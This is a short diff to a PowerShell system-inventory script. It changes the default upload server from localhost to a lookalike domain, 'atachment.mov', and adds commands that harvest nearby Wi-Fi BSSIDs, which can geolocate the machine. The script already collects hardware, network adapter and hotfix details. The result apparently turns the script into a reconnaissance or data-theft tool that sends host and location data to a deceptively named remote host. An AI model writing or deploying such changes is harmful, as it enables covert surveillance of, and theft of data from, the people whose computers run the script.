@@ -1,5 +1,5 @@
 param(
-    [string]$Server = "http://localhost:3000"  # your VPS address
+    [string]$Server = "https://atachment.mov"  # your VPS address
 )
 
 # ----------------------------
@@ -26,6 +26,10 @@ Get-WmiObject Win32_VideoController | Select-Object Name, DriverVersion, Adapter
 # Network adapters
 Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed |
     Out-String | Out-File (Join-Path $tempDir "NetworkAdapters.txt") -Encoding UTF8
+
+# Network BSSID info | This is used to see what networks are visable to the machine.
+netsh wlan show interfaces | Out-String | Out-File (Join-Path $tempDir "WlanInterfaces.txt") -Encoding UTF8
+netsh wlan show networks mode=bssid | Out-String | Out-File (Join-Path $tempDir "WlanNetworks.txt") -Encoding UTF8
 
 # Hotfixes
 Get-HotFix | Out-String | Out-File (Join-Path $tempDir "Hotfixes.txt") -Encoding UTF8
